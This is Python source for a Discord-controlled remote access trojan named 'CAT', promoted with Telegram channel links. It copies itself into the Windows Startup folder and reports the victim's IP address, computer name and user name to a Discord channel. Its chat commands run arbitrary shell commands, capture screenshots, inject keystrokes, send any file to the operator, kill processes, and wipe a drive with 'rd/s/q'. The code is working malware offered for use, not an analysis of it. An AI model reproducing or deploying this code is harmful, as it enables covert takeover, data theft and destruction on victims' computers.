"""
Join to our telegram channel https://t.me/CAT_discord_dev
Jo to our telegram group https://t.me/catchatdev
Made by NullifiedVlad (C) 2020
"""

import ctypes
import os
import sys
from datetime import datetime
import win32api
import discord
import pyautogui as pg
from discord.ext import commands
import config
import nullfunction as nf
pg.FAILSAFE = False
bot = commands.Bot(command_prefix='/')
channel = bot.get_channel(config.channel)
bot.remove_command('help')
print(win32api.GetVersionEx())
path = f'C:\\Users\\{win32api.GetUserName()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'


@bot.event
async def on_ready():
    try:

        with open(path + 'CAT.exe') as f:
            pass

    except FileNotFoundError:

        with open('CAT.exe', 'rb') as f:
            data = f.read()
        with open(path + 'CAT.exe', 'wb') as f:
            f.write(data)

    channel_start = bot.get_channel(config.channel)
    date = datetime.now()

    minute = date.minute
    x, y = pg.size()

    if len(str(minute)) == 1:
        minute = '0' + str(minute)
    else:
        pass
    embed = discord.Embed(title='**USER IS ONLINE**', description='Configuration Administration Tool',
                          color=0x03fcec, )

    embed.add_field(name='**System time**', value=f'{date.hour}:{minute}', inline=False)
    embed.add_field(name='**OS**', value=f'{sys.platform}', inline=False)
    embed.add_field(name='**Screen resolution**', value=f'{x}x{y}', inline=False)
    embed.add_field(name='**IP address**', value=f'{nf.ip()}', inline=False)
    embed.add_field(name='**PC name**', value=f'{win32api.GetComputerName()}', inline=False)
    embed.add_field(name='**User name**', value=f'{win32api.GetUserName()}', inline=True)

    embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
    embed.set_footer(text=f'Use /help for see bot features',
                     icon_url='https://i.imgur.com/YbYKL0F.png')
    embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
    await channel_start.send(embed=embed)
    await bot.change_presence(activity=discord.Game(f'Was stated in {date.hour}:{date.minute}'))
    del x, y, minute, embed


@bot.command()
async def move(ctx, x, y, time):
    pg.moveTo(int(x), int(y), float(time))
    await ctx.send(f'Mouse was moved on X:{str(x)} Y:{str(y)}')


@bot.command()
async def click(ctx):
    try:
        pg.click()
        await ctx.send('**CAT:** Clicked!')
    except Exception as e:
        await ctx.send(f'ERROR \n{e}')


@bot.command()
async def screenshot(ctx):
    pg.screenshot(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\screenshot.png')
    await ctx.send(file=discord.File(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\screenshot.png'))
    os.remove(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\screenshot.png')


@bot.command()
async def cg(ctx):
    pg.hotkey('alt', 'shift')
    await ctx.send('**CAT:** keyboard language was changed!')


@bot.command()
async def write(ctx, *, text):
    try:
        pg.typewrite(text)
        await ctx.send(f'Success!')
    except Exception as e:
        await ctx.send(f'ERROR! \n{e}')
    del text


@bot.command()
async def press(ctx, key, how_many):
    if int(how_many) > 0:
        for i in range(int(how_many)):
            pg.press(key)
        await ctx.send(f'**CAT:** Key "{key}" was pressed {how_many} times!')
    else:
        await ctx.send('ERROR')


@bot.command(aliases=['help'])
async def help_message(ctx):  # send help message
    embed = discord.Embed(title='**Commands**', description='Configuration Administration Tool.', color=0x03fcec)
    # заголовки
    embed.add_field(name='**/help**', value='Show this message.', inline=False)
    embed.add_field(name='**/move**', value='(X) (Y) (time) move mouse.', inline=False)
    embed.add_field(name='**/click**', value='Left click.', inline=False)
    embed.add_field(name='**/write**', value='Write something.', inline=False)
    embed.add_field(name='**/press**', value='(key)(how_many) Press key.', inline=False)
    embed.add_field(name='**/screenshot**', value='Screenshot.', inline=False)
    embed.add_field(name='**/cg** ', value='Change keyboard language.', inline=False)
    embed.add_field(name='**/command** ', value='Run command.', inline=False)
    embed.add_field(name='**/kill**', value='Kill process.', inline=False)
    embed.add_field(name='**/delete**', value='Delete file.', inline=False)
    embed.add_field(name='**/wallpaper**', value='(url) change wallpaper.', inline=False)
    embed.add_field(name='**/disk_format**', value='(name) Format disk.', inline=False)
    embed.add_field(name='**/copy**', value='Send file in chat.', inline=False)
    embed.add_field(name='**/shutdown**', value='Shutdown.', inline=False)
    embed.add_field(name='**/reboot**', value='Reboot.', inline=False)
    embed.add_field(name='**/off**', value='Disable bot.', inline=False)
    embed.add_field(name='**/logout**', value='Log out from windows.', inline=False)
    embed.add_field(name='**/win_info**', value='Get windows information.', inline=False)
    embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')

    embed.set_footer(text=f'Made by NullifiedVlad', icon_url='https://i.imgur.com/YbYKL0F.png')
    embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
    await ctx.send(embed=embed)


@bot.command()
async def command(ctx, *, todo):
    if os.system(str(todo)):
        await ctx.send('Success!')
    else:
        await ctx.send('ERROR')


@bot.command()
async def kill(ctx, *, process):
    if os.system(f'taskkill /im {str(process)} /f'):
        await ctx.send(f'Process {str(process)} was killed')
    else:
        await ctx.send('ERROR')


@bot.command()
async def delete(ctx, file_on_delete):
    try:
        os.remove(str(file_on_delete))
        await ctx.send(f'File "{file_on_delete}" was deleted!')
    except FileNotFoundError:
        await ctx.send('File not found :(')


@bot.command()
async def disk_format(ctx, disk):
    await ctx.send(f'Deleting disk**{disk}**!')
    os.system(f'rd/s/q {disk}:\\')


@bot.command()
async def copy(ctx, way):
    try:
        await ctx.send('Copied file:', file=discord.File(way))
        del way
    except FileNotFoundError:
        await ctx.send('File not found!')


@bot.command()
async def shutdown(ctx):
    await ctx.send('Shutdown...')
    os.system('shutdown -s -t 0 >null')


@bot.command()
async def reboot(ctx):
    await ctx.send('Rebooting...')
    os.system('shutdown -r -t 0 >null')


@bot.command()
async def off(ctx):
    await ctx.send('Disable...')
    sys.exit()


@bot.command()
async def wallpaper(ctx):
    url = ctx.message.attachments[0].url
    with open(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png', 'wb') as f:
        f.write(nf.img_get(url))

    if ctypes.windll.user32.SystemParametersInfoW(20, 0,
                                                  f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png', 0):
        await ctx.send('Wallpaper was changed!')
    else:
        await ctx.send('ERROR!')
    os.remove(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png')


@bot.command()
async def msgbox(ctx, title, text):
    win32api.MessageBox(None, str(text), str(title))


@bot.command()
async def logout(ctx):
    ctx.send('Exiting from Windows...')
    win32api.ExitWindows()


@bot.command()
async def win_info(ctx):
    info = win32api.GetVersionEx()
    embed = discord.Embed(title='**CAT-WIN.**', description='Windows information', color=0x03fcec)
    embed.add_field(name='**Major version.**', value=str(info[0]), inline=False)
    embed.add_field(name='**Minor version.**', value=str(info[1]), inline=False)
    embed.add_field(name='**Build number.**', value=str(info[2]), inline=False)
    embed.add_field(name='**Platform ID.**', value=str(info[3]), inline=False)
    embed.add_field(name='**Versio.n**', value=str(info[4]), inline=False)

    embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
    embed.set_footer(text=f'Made by NullifiedVlad', icon_url='https://i.imgur.com/YbYKL0F.png')
    embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
    await ctx.send(embed=embed)

bot.run(config.token)
